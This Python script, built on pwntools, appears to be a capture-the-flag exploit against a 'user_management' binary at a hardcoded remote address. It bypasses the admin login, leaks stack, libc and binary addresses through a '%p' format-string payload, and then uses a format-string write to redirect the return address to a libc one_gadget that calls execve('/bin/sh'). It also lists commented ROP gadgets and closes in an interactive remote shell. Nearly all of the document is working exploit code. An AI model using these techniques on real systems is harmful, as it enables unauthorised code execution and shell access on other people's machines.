#!/usr/bin/env python3
from pwn import *

elf = exe = context.binary = ELF(args.EXE or './user_management')
libc = ELF(elf.libc.path)

host = args.HOST or '34.69.226.63'
port = int(args.PORT or 30884)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, aslr=False, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = "tmux splitw -h".split()
context.log_level = "debug"

gdbscript = '''
# b *0x5555555556c1
# b *0x55555555575b
# b *0x555555555e63
b *0x55555555575b
b *0x555555555716
b *0x555555555745
b *0x5555555556c1
continue
'''.format(**locals())

io = start()

def admin_login():
    payload  = b"manage users" + b"\x00" * 4 # 16 byte
    payload += b'pass' # new password

    io.sendlineafter(b': ', b'1')
    io.sendlineafter('?\n', payload)
    io.sendlineafter(b": ", b"MrAlphaQ")
    io.sendlineafter(b": ", b"pass")

def create_user(u, p, d):
    io.sendlineafter(b": ", b"2")
    io.sendlineafter(b": ", u)
    io.sendlineafter(b": ", p)
    io.sendlineafter(b": ", d)

def login(u, p):
    io.sendlineafter(b": ", b"3")
    io.sendlineafter(b": ", u)
    io.sendlineafter(b": ", p)

def sendPayload(u, p):
    admin_login()
    create_user(u, b"t", p)
    io.sendlineafter(b": ", b"4") # logout
    login(u, b"t")
    io.sendlineafter(b": ", b'5') # view desc

desc = b"AAAAA " + b"%p "*50

sendPayload(b't', desc)

io.recvuntil(b"is: ")
leak = io.recvline().split()
stack_addr = int(leak[1], 16) - 0x1e1e0
libc.address = int(leak[3], 16) - 0x114887
elf.address = int(leak[-4], 16) - 0x2037

# FMT payload
offset = 6 # maybe

# libc gadgest
# pop_rdi = libc.address + 0x000000000002a3e5 #: pop rdi ; ret
# pop_rsi = libc.address + 0x000000000002be51 #: pop rsi ; ret
# pop_rax_rdx = libc.address + 0x00000000000904a8 # : pop rax ; pop rdx ; pop rbx ; ret
# syscall = libc.address + 0x0000000000029db4 #: syscall
# binsh = next(libc.search('/bin/sh\x00'))

    # (rip+(8*0)): pop_rdi,
    # (rip+(8*1)): binsh,

    # (rip+(8*2)): pop_rsi,
    # (rip+(8*3)): 0,

    # (rip+(8*4)): pop_rax_rdx,
    # (rip+(8*5)): 0x3B,
    # (rip+(8*6)): 0,

    # (rip+(8*7)): syscall,

rip = stack_addr+0x20448

writes = {
    rip: (libc.address + 0xebc81)
}

payload = fmtstr_payload(6, writes, no_dollars=True)

sendPayload(b't2', payload)

print(payload)

print(f"stack @ {hex(stack_addr)}")
print(f"libc @ {hex(libc.address)}")
print(f"elf @ {hex(elf.address)}")
# print(f"binsh @ {hex(binsh)}")

io.interactive()

"""
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
0xebc85 execve("/bin/sh", r10, rdx)
0xebc88 execve("/bin/sh", rsi, rdx)
0xebce2 execve("/bin/sh", rbp-0x50, r12)
0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
"""